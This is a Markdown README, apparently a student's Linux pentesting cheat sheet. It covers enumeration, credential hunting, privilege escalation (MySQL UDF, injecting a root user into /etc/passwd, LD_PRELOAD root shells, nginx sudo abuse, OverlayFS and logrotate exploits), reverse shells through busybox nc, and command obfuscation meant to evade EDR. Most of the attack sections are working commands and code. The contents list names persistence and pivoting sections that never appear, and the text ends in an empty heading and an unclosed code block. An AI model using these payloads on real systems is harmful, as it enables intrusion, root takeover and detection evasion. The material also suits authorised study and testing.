# Linux-Pentest
A repository to store some linux exploitation and technique I've seen during my studies.

## List of contents:
- [Enumeration](#Enumeration)
  - [Manual Enumeration](#Manual-Enumeration)
      - [General](#General)
      - [Credential Harvesting](#credentials-harvesting)
      - [Information Harvesting](#information-harvesting)
      - [OS](#os)
      - [Network](#network)
      - [Detect Defense mechanisms](#detect-defense-mechanisms)
      - [Limited enumeration](#Limited-enumeration)
  - [Automated Tools](#automated-tools)

- [Privilege Escalation:](#Linux-Privesc)
  - [Hardcoded passwords](#Hardcoded-passwords)
  - [Privesc via mysql admin](#Privesc-via-mysql-admin)
  - [Weak file permissions](#Weak-file-permissions)
    - [/etc/passwd write right](#etcpasswd-write)
    - [/etc/shadow write right](#etcshadow-write)
    - [/etc/shadow read right](#etcshadow-read)
    - [Commands to search for other files](#commands-to-search-for-other-files)
  - [Shell escape sequence](#Shell-escape-sequence)
  - [Sudo env variables](#Sudo-env-variables)
  - [Sudo nginx](#Sudo-nginx)
    - [Sudo nginx LFI](#Sudo-nginx-lfi)
    - [Sudo nginx RCE](#Sudo-nginx-rce)
  - [Cron Jobs](#Cron-jobs)
  - [SUID/SGID](#SUIDSGID-binaries)
    - [SUID/SGID shared object import](#SUIDSGID-shared-object-import)
    - [SUID/SGID relative path](#SUIDSGID-relative-path)
    - [SUID/SGID shell function](#SUIDSGID-shell-function)
    - [SUID/SGID bash PS4 debugging](#SUIDSGID-bash-PS4-debugging)
  - [Doas](#Doas)
  - [SSH keys](#ssh-keys)
    - [Private key](#private-key)
    - [Public key](#public-key)
  - [NFS](#nfs)
  - [Kernel Exploits](#kernel-exploits)
    - [OverlayFS](#overlayfs)
    - [Logrotate](#Logrotate)

- [Linux-evasion:](#Linux-evasions)
  - [Obfuscation](#Obfuscation)
      - [Base64 encoding](#base64-encoding)
      - [Hex encoding](#hex-encoding)
      - [Wildcard completation](#wildcard-completation)
      - [String noise](#string-noise)
      - [Forbidden Chars](#forbidden-chars)
      - [Alternative Shell Execution](#alternative-shell-execution)
      - [Bashfuscator](#bashfuscator)
      - [Source code obfuscation](#Source-code-obfuscation)
  
  - [Sandbox Bypass](#Sandbox-bypass)
    - [Docker sandbox](#Docker-sandbox)
    - [Python sandbox](#Python-sandbox)
      - [Forbidden import string](#Forbidden-import-string)
      - [Only help](#Only-help)
        
- [Persistence:](#Persistence)
  - [Obfuscated persistence](#Obfuscated-persistence)
  - [Add user](#Add-user)
  - [Backdoor bashrc](#Backdoor-bashrc)
  - [Backdoor MOTD](#Backdoor-motd)
  - [Backdoor webshell](#Backdoor-webshell)
  - [Backdoor APT](#Backdoor-apt)
  - [Backdoor Systemd](#Backdoor-systemd)
  - [Backdoor SO](#Backdoor-so)
  - [Backdoor XDG](#Backdoor-xdg)
  - [Backdoor rc.local](#Backdoor-rc.local)

- [Pivoting](#Pivoting)
  - [SSH tunneling](#ssh-tunneling)
  - [Metasploit](#Metasploit)
  - [Chisel](#Chisel)
  - [Ligolo](#Ligolo)

- [Special Thanks](#Special-Thanks)
  
---
   
# Enumeration:

### Manual Enumeration:

When gaining access to a Linux machine, the most crucial step is enumeration. We need to determine our identity, identify the system's current state, discover what is present, and gather other relevant information.

##### General:
User:
```bash
whoami #command to identify the current user
```
User id and Groups id:
```bash
id #command to list the groups the current user belongs to
```
System uptime:
```bash
uptime #command to retrieve the system uptime and current date
```
History:
```bash
history #command to display the command history
```
Enviroment variables:
```bash
env or echo $PATH #command to list environment variables
```
Users info:
```bash
cat /etc/passwd or getent passwd #command to read the list of users
```
Login history:
```bash
lastlog #command to retrieve the login history
```
Logged-in users:
```bash
w #command to retrieve who is currently login 
```
Groups:
```bash
cat /etc/group or getent group <name> #command to list groups
```

##### Credentials harvesting:
`/etc/fstab may contain credentials`
```bash
cat /etc/fstab #command to read storage devices 
```
Credentials in config files:
```bash
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null #command to search for config file with possible credentials
```
Password/Passwd regex:
```bash
find / -type f -exec grep -li 'PASSWORD\|PASSWD\|PASS' {} + 2>/dev/null #command to search for any files containing the words password or passwd
```
or:
```bash
find / -type f -exec grep -li 'PASSWORD' {} + 2>/dev/null
```

##### Information harvesting:
Hidden file:
```bash
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null #command to search for hidden files
```
Hidden folders:
```bash
find / -type d -name ".*" -ls 2>/dev/null #command to search for hidden folders
```
History files:
```bash
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null #command to search for history files
```
Config files:
```bash
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null #command to search for config files
```
Proc informations:
```bash
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n" #command to read proc filesystem to retrieve information about processes, hardware
```
Script files:
```bash
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share" #command to search for scripts files
```
Capabilities in all file system:
```bash
getcap -r / 2>/dev/null
```
Capabilities in binary path:
```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; #command to search any capabilities
```
Temp files:
```bash
ls -l /tmp /var/tmp /dev/shm #command to list temporary files
```
Crontabs:
```bash
cat /etc/crontab #comand to read crontabs
```
Processes:
```bash
ps -faux #command to list all running processes
```
Installed apps and version:
```bash
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list #command to list application installed and their versions
```
Sudo permission on binaries:
```bash
sudo -l #command to show which binaries can be run with sudo
```
Sudo version:
```bash
sudo -V #command to see the sudo version
```
Services:
```bash
systemctl list-units --type=service or service --status-all #commands to display information about the services
```

##### OS:
Os information:
```bash
uname -a #command to display OS and hardware information
```
Release:
```bash
cat /etc/os-release #command to read OS release information
```
Cpu info:
```bash
lscpu #command to display information about the CPU
```
Block and partitions:
```bash
lsblk #command to list available block devices and partitions 
```
Disk space and partitions:
```bash
df -h # command to display disk space usage for partitions
```
Login shells:
```bash
cat /etc/shells #command to read valid login shells
```
Printers:
```bash
lpstat #command to check for the presence of printers
```

##### Network:
Hostname:
```bash
hostname #command to display the server name
```
Get machine ip inside a docker with no network tool:
```bash
hostname -I   #get all the ip addresses of the machine
```
Network interfaces subnets and ip:
```bash
ip a #command to display information about network interfaces and subnets
```
Routing table:
```bash
netstat -rn #command to retrieve the routing table
```
Internal DNS:
```bash
cat /etc/hosts #command to read the internal DNS
```
Internal DNS configuration:
```bash
cat /etc/resolv.conf #command to read DNS configuration
```
Open ports with relative process:
```bash
ss -tulpn #command to list open ports and associated processes
```

##### Detect Defense mechanisms:
AppArmor:
```bash
ls -d /etc/apparmor* #command to list AppArmor configuration folders (control access)
```
Grsecurity:
```bash
uname -r | grep "\-grsec" #command to check for the Grsecurity (kernel patch)
```
Execshield:
```bash
grep "exec-shield" /etc/sysctl.conf #command to check for Execshield configuration (general protectiom)
```
SELinux:
```bash
sestatus #command to check the status of SELinux (policy model)
```
ASLR protection:
```bash
cat /proc/sys/kernel/randomize_va_space #comand to check ASLR (memory defense) 
```

#### Limited enumeration:
port scanner with netcat:
```bash
for i in {1..65535}; do nc -v -n -z -w 1 <ip> $i; done   #take a lot of time
```
subnet (/24) scanner with netcat (specific port):
```bash
for i in {1..254}; do nc -v -n -z -w 1 10.10.1.$i <port_to_check>; done   #chose a port to scan among the subnet
```
subnet scan with nmap:
```bash
nmap -sn 10.10.10.0/24 #scan a subnet of your choice
```
### Automated Tools:
There are tools that can automate enumeration such as:

- [Linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

- [Linenum](https://github.com/rebootuser/LinEnum)

- [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)

# Privilege Escalation:

### Hardcoded passwords:
When we execute commands that requires authentication, there is often a flag (like -p or -P), where we can write the password in the command itself.<br>
#### Config files:
We can try to search for those passwords around, as we already saw in [Information harvesting](#Information-harvesting) section.<br>
#### History files:
In a production environment the history file should have this line in place: `export HISTFILE=/dev/null
` otherwise all the commands are visibles to whoever has access to the file.<br>
We can inspect the content of the history files in search of some passwords left around:
```bash
cat ~/.*history | less
```
#### Running commands:
When we start some services via command line it is possible to see the command from all the users on the machine:<br>
For example if some privileged user enters in mysql with an hardcoded password we can see the command trough:
```bash
ps -faux
```
Or we can also listen for spawning processes with [Pspy64](https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64) or [Pspy32](https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32).

### Privesc via mysql admin:
If the mysql service is running as root we can use a popular exploit to execute commands: 
We will use [Raptor exploit](https://www.exploit-db.com/exploits/1518) that we will compile on our local machine as follow.
```bash
curl https://www.exploit-db.com/download/1518 -o raptor.c
gcc -g -c raptor.c -fPIC
gcc -g -shared -Wl,-soname,raptor.so -o raptor.so raptor.o -lc
```
Once we have done that we can upload the raptor.so file to the victim machine (see file upload part).
To get an rce we need to run the following commands in mysql:
```bash
mysql -u root <pass> #if we have the password
```
Now in interactive shell:
```mysql
use mysql;
create table testing(line blob);
insert into testing values(load_file('/tmp/raptor.so'));
select * from testing into dumpfile '/usr/lib/mysql/plugin/raptor.so';
create function test_check returns integer soname 'raptor.so';
select test_check('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```
By doing so we have created a copy of bash with the [SUID bit](https://www.computerhope.com/jargon/s/setuid.htm) set.

### Weak file permissions:
If we want to explore manually the file system to be a bit stealthier we can run this command:
```bash
ls -la <file>
```
to get all the file permissions and attributes (pretty basic).

If we have those permissions to the files below, we can privesc to root(99% of times):

* /etc/passwd _write_
* /etc/shadow _read_ _write_

##### /etc/passwd write right:
The __/etc/passwd__ file was once used to store users password hashes, now it just contains users and informations word readable but (in some systems) we can still insert an hash and login with that.

We need to create the hash of the password we choose and it is also important to use the same algorithm __yescrypt__ as the linux system to remain as hidden as possible:

Command to generate the hash:
```bash
openssl passwd <password>
```
example output: `$1$f7E3tyrc$knAMNJuzDNKX1HX7k/Vbn1`

Now we can inject the password in a new root user:
```bash
echo 'newroot:$1$f7E3tyrc$knAMNJuzDNKX1HX7k/Vbn1:0:0:root:/root:/bin/bash' >> /etc/passwd
```
Now we can login with our newroot user:
```bash
su newroot  #insert the previous password
```
##### /etc/shadow write right:
We can do pretty much the same thing that we did with /etc/passwd, this time we need to generate a different hash:
```bash
mkpasswd -m sha-512 <password> 
mkpasswd -m yescrypt <password>
```
__Sha-521 and Yescrypt are shown because the former was used in older versions while the latter was used in current ones__

example sha-512: `$6$Yl1wFZB8OQKdaRtT$9n15GuPRsK.cpm9lMHSjqyDA2FtGHPD/FOjT5hLpshQmIu6Eppp66hmGhZnYZZoAQAgKNQzMMNlrw/Z8FNTFO/`

example yescrypt: `$y$j9T$WWQkTwY3K4ypmjLPoz93h1$V08ZrcWG9OXtqM3wIWEF0ocUmJwxG7WPr19N5/nS9G2`

Once we have the hash we can change the occurency on the file:
```bash
root:<new_hash>:17298:0:99999:7:::
```
example with sha-512: `root:$6$Yl1wFZB8OQKdaRtT$9n15GuPRsK.cpm9lMHSjqyDA2FtGHPD/FOjT5hLpshQmIu6Eppp66hmGhZnYZZoAQAgKNQzMMNlrw/Z8FNTFO/:17298:0:99999:7:::`

example with yescrypt: `root:$y$j9T$WWQkTwY3K4ypmjLPoz93h1$V08ZrcWG9OXtqM3wIWEF0ocUmJwxG7WPr19N5/nS9G:17298:0:99999:7:::`

Now we can login as root:
```bash
su root #insert nuovapassword
```
##### /etc/shadow read right:
The /etc/shadow, as we saw above contains all the user's password hashes, so we can crack them to recover passwords:

First step, We can identify the hash type with [haiti](https://github.com/noraj/haiti) or hashcat auto detect mode:
```bash
sudo gem install haiti-hash
haiti '<hash>'
```
```bash
hashcat  <hash_file>
```

Then save in a file: 
```bash
echo -n '<password_hash>' > hash_to_crack.hash
```
Now we can either crack with john:
```bash
john <hash_to_crack>.hash -w=/usr/share/wordlists/rockyou.txt
```
or with hashcat (using also gpus):
```bash
hashcat hash_to_crack.hash
```
_For modern systems like kali or ubuntu we can crack the yescrypt hash like this:_
```bash
john hash_to_crack.hash --format=CRYPT -w=/usr/share/wordlists/rockyou.txt
```

##### Commands to search for other files:

We can still search recursivly those files other files with weak permissions via the following commands(may set allarms):

- This command we will find all the files owned by `OUR CURRENT USER`
```bash
find / -user `whoami` -type f -exec ls -la {} \; 2>/dev/null | grep -v '/proc/*\|/sys/*'
```

- This command we will find all the files of `THE GROUP` that we `ARE IN`
```bash
find / -group `whoami` -type f -exec ls -la {} \; 2>/dev/null | grep -v '/proc/*\|/sys/*'
```

- This command we will find files that are `WORD WRITEABLE`
```bash
find / -writable ! -user `whoami` ! -group `whoami` -type f -exec ls -al {} \; 2>/dev/null | grep -v '/proc/*\|/sys/*'
```

Eventually we could also check for all the files word readable on the file stytem (they are a lot)
```bash
#We can run this command on specific directories:

find /opt/ -readable ! -user `whoami` ! -group `whoami` -type f -exec ls -laR {} \; 2>/dev/null
find /home/ -readable ! -user `whoami` ! -group `whoami` -type f -exec ls -laR {} \; 2>/dev/null
find /var/ -readable ! -user `whoami` ! -group `whoami` -type f -exec ls -laR {} \; 2>/dev/null
find /tmp/ -readable ! -user `whoami` ! -group `whoami` -type f -exec ls -laR {} \; 2>/dev/null
```

### Shell escape sequence:
Some binaries in linux has a functionality where, by pressing a keyboard combination, we can spawn a shell, that's dangerous when one of those binaries is allowed to run with sudo.

This is a [list](https://gtfobins.github.io/#+shell) containing all the binaries that have a shell escape sequence
 
In general the most frequent way is by typing:
```bash
!/bin/sh
```
It may vary based on the programming language of the linux file.

### Sudo env variables:
when we call the sudo programm on linux we have 3 options:

1. File to run with sudo privilege
 
2. Path variable to set when calling the sudo command

3. Enviroment variable to set, keep or reset

Those variables MUST be resetted, or at least changed from the user ones in fact if a user can keep the `LD_PRELOAD` or `LD_LIBRARY_PATH` he can inject his own shared object before or while running the sudo executable.

__There are also persistence techniques available at this [link](#Backdoor-so)__

#### LD_PRELOAD:
This variable loads the shared object to be run BEFORE the executable to run with sudo start to exploit this we need to create this C script named __preload.c__:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```
now we need to compile it with:
```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
```
Once we compiled either on the target or locally we need to have the file __preload.so__ on the target machine.

Now we can set the `LD_PRELOAD` variable to our shared object file and get a root shell:
```bash
sudo LD_PRELOAD=/tmp/preload.so <any_programm_to_run_with_sudo> #use your path to the .so file
```
#### LD_LIBRARY_PATH
This variable set the path of the shared library that the file runned with sudo will pick, to check which shared library our executable is importing we can do:
```bash
ldd <file_we_can_run_with_sudo> #here an example with /usr/bin/apache2
```
example output:
```bash
linux-vdso.so.1 =>  (0x00007fffa5ac3000)
libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f75564ba000)
libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007f7556296000)
libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007f755605c000)
libpthread.so.0 => /lib/libpthread.so.0 (0x00007f7555e40000)
libc.so.6 => /lib/libc.so.6 (0x00007f7555ad4000)
libuuid.so.1 => /lib/libuuid.so.1 (0x00007f75558cf000)
librt.so.1 => /lib/librt.so.1 (0x00007f75556c7000)
libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f7555490000)
libdl.so.2 => /lib/libdl.so.2 (0x00007f755528b000)
libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f7555063000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7556977000)
```
let's hikjack for example the `libuuid.so.1` file.

We need to create a C code named __library_path.c__:
```bash
#include <stdio.h>
#include <stdlib.h>

static void syschecker() __attribute__((constructor));

void syschecker() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```
Now we can compile it with:
```bash
gcc -o /tmp/<.so_file_imported_by_sudofile> -shared -fPIC library_path.c
```
Then we just need to run the file by setting the path of the shared libraries:
```bash
sudo LD_LIBRARY_PATH=/tmp <file_to_run_with_sudo>  #apache2 for example
```

### Sudo nginx:
If we find a nginx binary among the output of `sudo -l` we can escalate privilege:
#### Sudo nginx lfi:
If we can run nginx as sudo we can't directly spawn an elevated shell, however we can get an lfi via this config file in `/tmp/lficonf.conf`:
```javascript
user root;    #change with the user u can run the sudo command as
worker_processes 3;

events {
    worker_connections 1024;
}

http {
    server {
        listen 7331; #chose a port where expose the filesystem
        root /;  #if we can run nginx as another user we can see his file
        autoindex on;
    }
}
```
Once we have created this config we can start the server with:
```bash
sudo /usr/sbin/nginx -c /tmp/lficonf.conf
```
#### Sudo nginx rce:
If the LFI above is not enough for us we can try to get RCE (ssh need to be open).<br>
With the technique above we will add a HTTP method to the nginx configuration file, the PUT method permit us to upload a public key in the ssh folder of the user.

We first need to create the SSH key pair on our local machine:
```bash
ssh-keygen -t rsa -b 2048 -C '<user>@<host>' -f /tmp/nginx_key
```
Now we need to create this config file on the remote server in `/tmp/rcenginx.conf`:
```javascript
user root;    #change with the user you can run nginx
worker_processes 3;

events {
    worker_connections 1024;
}

http {
    server {
        listen 7332;    #chose the port to expose
        root /;
        autoindex on;
        dav_methods PUT;    #this is the method for file upload
    }
}
```
We can start the server with:
```bash
sudo nginx -c /tmp/rceconf.conf
```
Now back to our attacker machine we can upload the public key we generated:
```bash
curl -X PUT http://<remote_victim_ip>:<remote_victim_port>/root/.ssh/authorized_keys -d "$(cat /tmp/nginx_key.pub)"  #change root folder with the user that tou have access to
```
Now we can login with SSH and private key:
```bash
ssh -i /tmp/nginx_key root@<remote_victim_ip> #change the user with the one that u managed to compromise
```
### Cron jobs:
Cron jobs are automatic tasks that runs every range of time indicated by a [time mask](https://crontab.guru/) are written in the `/etc/crontab` file and they follow this pattern:
```bash
#VARIABLES TO SET:

SHELL=/bin/sh     
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# CRONTAB FORAMT:
.---------------- minute (0 - 59) '*' means every unit of measure 
|  .------------- hour (0 - 23)
|  |  .---------- day of month (1 - 31)
|  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
|  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
|  |  |  |  |
*  *  *  *  *   user    <command_to_be_executed>
*  *  *  *  *   root    /bin/ls -la | /bin/grep 'a'
```
#### Writeable path:
If we can controll the path where the crontab is running (as elevated user) we can change the command.

__Path must be first in order, otherwise our binary will come after the legit one.__

#### Wildcard Injection:
If a crontab has a command with a wildcard (and we can supply the value of the wildcard), we can get command injection.

Here we can see an example of wildcard:
```bash
* * * * * root /bin/ls -la /tmp/*
```
We can create a file name injection:
```bash
cd /tmp/
touch -- '$(busybox nc <ip> <port> -e bash)'  #enjoy your shell
```

### SUID/SGID binaries:
If we want to automatically run binaries with owner permissions, we can assign the SUID bit to the binary. 
This way, we don't need to switch users to run a command. 
Although it is quite helpful, this feature can also be dangerous because if the binary lacks proper protection, it retains the user token, which can be abused.

To assign SUID permission we can do:
```bash
chmod u+s <binary> #assign the user setuid
chmod 4755 <bianry> #assign the bit in octal
```
To assign SGID we can do:
```bash
chmod +g <binary>  #assign group id
chmod 2755 <binary>  #assign the bit in octal
```
If we want to set both SUID and SGID:
```bash
chmod +sgx <binary>  #assign SUID SGID and executable bit
chmod 6755 <binary>
```
To find those files in the filesystem, we can use this command:
```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

we can also run two separate commands in order to find SUID or SGID:
SUID:
```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```
SGID:
```bash
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```
For a general overview you can check this [page](https://gtfobins.github.io/#+suid) with a list of vulnerable binaries to SUID/SGID.
#### SUID/SGID shared object import:
When an ELF file is compiled it link all the necessary libraries to work, and call them at runtime.<br>
If we run this command in fact:
```bash
strace ./<binary>
```
We can see all the library imported with the syscall:
```bash
access("<shared_library>", <access_flag>)
```
When a library is found it will use another syscall:
```bash
open("<shared_library>", O_RDONLY)
```
If the library it's not found in the path, the access syscall will print this error: 
```bash
access("<shared_library>", <access_flag>)         = -1 ENOENT (No such file or directory)
```
We can check if we have write permissions to the `<shared_library>`.

If that is the case we can create our own library named hijack.c:
```c
#include <stdio.h>
#include <stdlib.h>

static void unitTester() __attribute__((constructor));

void unitTester() {
        setuid(0);
        system("/bin/bash -p");
}
```
Now we can compile it in the path that we can write:
```bash
gcc -shared -fPIC -o <shared_library> hijack.c
```
Eventually we can execute the SUID binary getting a shell as the owner of the binary.

#### SUID/SGID relative path
If we have a custom SUID/SGID ELF file is important (when possible) to reverse-engineer what the binary does.<br>
For example if the binary has a string `system` it's highly probable that it will run bash commands.<br>

##### Reverse engineering:
To reverse engineer the binary we can do a lot as we can see [here](https://medium.com/geekculture/reversing-elf-tryhackme-writeup-3d528bcf7fce)<br>
For a rapid overview we can limit our self to strings, cat and ghidra:<br>

- Strings:
```bash
strings <suid/sgid_binary>
```
if we see a bash command called without absolute path for example:
```bash
cp /home/user/backupfile /backup/backup1
```
#### SUID/SGID shell function
When we find, from the [Reverse engineering](#Reverse-engineering) part a function `system` calling commands we can try to use a [bash function](https://linuxize.com/post/bash-functions/) (It is a feature of Bash versions <4.2-048>).

For example we find this command inside a SUID binary:
```c
system('/usr/bin/ls /home/user/');
```
We can create a bash function named `/usr/bin/ls` and export it, so when we call the SUID binary executing that command will result in code execution:
```bash
function /usr/sbin/ls { /bin/bash -p; }
export -f /usr/sbin/ls
```
#### SUID/SGID bash PS4 debugging
__ONLY WORKS WITH BASH BELOW 4.4__<br>
__YOU CAN GET BASH VERSION WITH `bash --version`__

When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.

We can run the SUID binary and setting the PS4 variable to a command that we want to execute as SUID user:
```bash
env -i SHELLOPTS=xtrace PS4='$(<command_to_run_elevated>)' <suid_script>
```

### Doas
DOAS, short for "do as," is a security program for executing commands with elevated privileges on Unix-like systems.<br>
It serves as a more secure and straightforward alternative to sudo.<br>
While its default implementation is in OpenBSD, it can also be found in other operating systems.
* Main configuration file:<br>
  * OpenBSD: /etc/doas.conf<br>
  * Other systems: /usr/local/etc/doas.conf or /etc/doas.conf<br>
* User Config file:<br>
  * OpenBSD: /etc/doas.user<br>
  * Other systems: /usr/local/etc/doas.user or /etc/doas.user<br>

### SSH keys:
Probably the best way to login inside ssh is via a private key.<br>
In order to do that we need to generate the private key (that the client will present to the server) and the public key (that the server must have to validate the private key).<br>
The key pair should be generated on the client machine, then the public key should be added to the `/home/<user>/.ssh/authorized_keys` file.

IT admin often generate the key pair on the server and only then copy the private key to the clients.

If we have access to the user's ssh folder we can either steal the private key or add our public key to the authorized_keys file:
#### Private key:
If we find a key either in the `/.ssh/` folder or somewhere in the file-system we can access to the machine by simply:
```bash
#copy the private key on you attack machine in victim_key
chmod 600 victim_key
ssh -i victim_key <user>@<ip> [-p <ssh_port>]
```
#### Public key:
If we didn't find any private key but we have write permissions over the user home directory we can add our own key:
```bash
#generate key pair on attacker machine
ssh-keygen -t rsa -b 2048 -C '<user>@<host>' -f /tmp/ssh_key
#save the public key on the victim machine in /tmp/pub
cat /tmp/pub >> /home/<user>/.ssh/authorized_keys #add the key to the file if already exits, otherwise use > instead of >>
```
eventually log in with the private key:
```bash
ssh -i /tmp/ssh_key <host>@<ip> [-p <ssh_port>]
```
### NFS:
NFS (Network File System) is a technology that implements file systems shared on the network, it uses (by default) ports 111 (TCP and UDP) and 2049 (TCP and UDP).

It's a practical way to share system volume without reconfiguring them all the times, by default the client of the NFS has the nobody privilege

NFS has also a feature called `no_root_squash` and `no_all_squash` that maps the UID/GID of the nfs client to the actual UID/GID of the user that started the NFS.<br>
This means we can access the NFS remotly and create a SUID reverse shell.

First we need to list the mounting points from our attacker machine with:
```bash
showmount -e <victim_ip>
```
Then we need to create a mount point on our attacker machine:
```bash
mkdir /mnt/nfs_mounting
mount -t nfs [-o vers=2] <victim_ip>:/<mounting_point_found> /mnt/nfs_mounting -o nolock
```
Once we have the share on our system we can create the revshell:
```bash
cd /mnt/nfs_mounting
echo -e '#!/bin/bash\nbusybox nc <attacker_ip> <attacker_port> -e bash' > libtest.sh
chmod +xs libtest.sh
```
Now we just need to start the listener and execute the reverse shell either inside the victim machine or from the NFS.
# Linux evasions:
In UNIX like world, Similary to windows, we have detection techniques and security measures, in order to bypass them we need to out-smart those systems.

### Kernel Exploits:

If the manual enumeration and the automated one don't produce any results, we can use the kernel exploits, which as the name suggests, exploit internal vulnerabilities, and it's good to be aware of them as they can make life easier in ports.

__DISCLAIMER:__

__attention as kernel exploits can be unpredictable__

##### OverlayFS:

This exploit can be used to manipulate the Overlay Filesystem (a filesystem that allows multiple filesystems to be __overlay__ so that they appear as a single one) to create a malicious payload (root-owned setuid binary) and escalate privileges.

__Prerequisites:__

If you enter the command `uname -r`, you check see that the kernel version is lower than 6.2

There are 2 POC one written in C and one in bash, for completeness both are included.

__Poc in C:__

First step, download the poc:
```bash
git clone https://github.com/xkaneiki/CVE-2023-0386.git
cd CVE-2023-0386
```
Second step, compiling the C code:
```bash
make all
```
Third step run the first command:
```bash
./fuse ./ovlcap/lower ./gc
```
Then in another shell (Enter via SSH if it's possible) on the same target machine run this command:
```bash
./exp
```

> From a github repository this [one](https://github.com/xkaneiki/CVE-2023-0386)

__Poc in bash:__

Poc written in bash requires to run a one-liner command:
```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
```

> from a reddit post this [one](https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/)

##### Logrotate:

logrotate is a utility in the Linux operating system designed to manage the rotation, compression, archiving, and deletion of log files. This utility is useful to ensure that log files do not become excessively large.

Command to see the configuration:
```bash
cat /etc/logrotate.conf
```
If we want to exploit logrotate we need some prerequisites:

- we need write permissions on the log files

- logrotate must run as a privileged user or root
  
- vulnerable versions (3.8.6, 3.11.0, 3.15.0, 3.18.0)

If we fulfill the prerequisites above we can proceed with the exploit called [Logrotten](https://github.com/whotwagner/logrotten):
```
git clone https://github.com/whotwagner/logrotten.git
```
We must create a payload file with for example a revshell inside:
```bash
echo -e '#!/bin/bash\n<script>' > /tmp/payload.sh
chmod +x /tmp/payload.sh
```
Then there are now two cases in order to compile the exploit:

- Host machine use the following command:
```bash
gcc logrotten.c -o logrotten -static
```
- Target machine use the following command:
```bash
gcc logrotten.c -o /tmp/logrotten
```
Execute with:
```bash
chmod +x /tmp/payload.sh
/tmp/logrotten -p /tmp/payload.sh <path_to_log_files>
```

__DISCLAIMER:__

__The exploit doesn't always work at first try because is a race condition__

##### Dirty Sock:



### Obfuscation:

##### Base64 encoding:
A way to evade signature-based detections is with command or strings obfuscation:

- Example 1:

We can generate a base64 paylod of the command we'd like to run:
```bash
echo -n '<command_to_execute>' | base64 -w0
```
To execute it on the target machine:
```bash
echo -n '<base64_payload>' | base64 -d | sh
```
- Example 2:

another base64 execution:
```bash
bash<<<$(base64 -d<<<'<base64_command>')
```
##### Hex encoding:
We can also use hexadecimal rapresentation

- Example 1:
```bash
echo -n '<command_to_execute>' | xxd -p | tr -d '\n'
```
to execute it:
```bash
echo -n '<hex_encoded_payload> | xxd -p -r | sh
```
- Example 2:
```bash
xxd -r -ps <(echo <hex_command>) | sh
```
- Example 3:
```bash
printf '<command_to_execute>' | od -A n -t x1 | sed 's/ //g' | sed 's/../\\x&/g' | tr -d '\n'
```
to execute it:
```bash
echo -e '<hex_encoded_string>' | sh
```
##### Wildcard completation:
We can obfuscate commands using [bash wildcard](https://linuxhint.com/bash_wildcard_tutorial/).

__MAY NOT WORK IF THE MACHINE HAS SOME PARTICULAR BINARIES THAT INTERFEER WITH THE PATH!__

This is an example on binary path(?):
```bash
/?i?/e?h? '<command_to_run>' | /?i?/b??h  #we will run /bin/echo ... | /bin/bash
```
This is an example with * wildcard (less stealthy):
```bash
/b*n/e*ho '<command_to_run>' | /b*n/b*sh
```
We can also list files without using ls:
```bash
cd <folder_to_list_files>
/*i*/e?h? *  #execute echo * resulting in ls
```
#### String Noise:
To evade some EDR or security products we can try to write some chars in weird way:

- _square braces chars:_
```bash
/[b][i][n]/[e][c][h][o] 'command_to_run' | /[b][i][n]/[s][h]
```
- _quoted chars:_
```bash
e'c'h''o'' 'command_to_run' | "b"a'''s'"h"'' 
```
- _backslashes:_
```bash
\e\c\h\o '<command_to_run>' | \b\as\h
/\/////bin///\/\////echo '<command_to_run>' | /\//bin/\/\/sh
```
- _at sign:_
```bash
e$@c$@h$@o $@'<command_to_run>'$@ | b$@a$@s$@h$@
```
- _uppercase transforming:_
```bash
$(tr "[A-Z]" "[a-z]"<<<"<camelcase_command_to_run>") #to execute commands like bUsYBox Nc ..
```
- _uppercase transformation with printf:_
```bash
$(a="<uppercase_command_to_run>";printf %s "${a,,}")
```
- _adding errors and fake commands:_
```bash
l$(a)s${IFS}-$(a)la #execute ls -la with IFS space bypass and $(a) null command
```
- _reversed strings:_
```bash
echo '<reversed_command>' | rev
```
also:
```bash
$(rev<<<'<reversed_command_to_run>')
```
##### Forbidden chars:
Somethimes we can't use chars like spaces or slashes.

- _forbidden spaces:_
```bash
ls${IFS}-la
```
```bash
{ls,-la}
```
```bash
ls$IFS-la
```
```bash
IFS=à
a=lsà-la
$a
```
```bash
